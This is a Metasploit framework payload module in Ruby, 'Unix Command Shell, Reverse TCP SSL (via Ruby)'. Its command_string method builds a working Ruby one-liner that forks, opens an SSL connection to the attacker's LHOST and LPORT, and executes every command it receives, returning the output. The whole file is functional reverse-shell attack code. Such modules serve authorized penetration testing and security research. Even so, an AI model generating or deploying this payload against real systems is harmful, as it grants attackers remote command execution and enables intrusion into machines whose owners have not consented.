##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 185

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP SSL (via Ruby)',
        'Description' => 'Connect back and create a command shell via Ruby, uses SSL',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcpSsl,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'ruby',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
    register_advanced_options(
      [
        OptString.new('RubyPath', [true, 'The path to the Ruby executable', 'ruby'])
      ]
    )
  end

  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  def command_string
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    res = "#{datastore['RubyPath']} -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new"
    res << "(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while"
    res << "(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end'"
    return res
  end
end
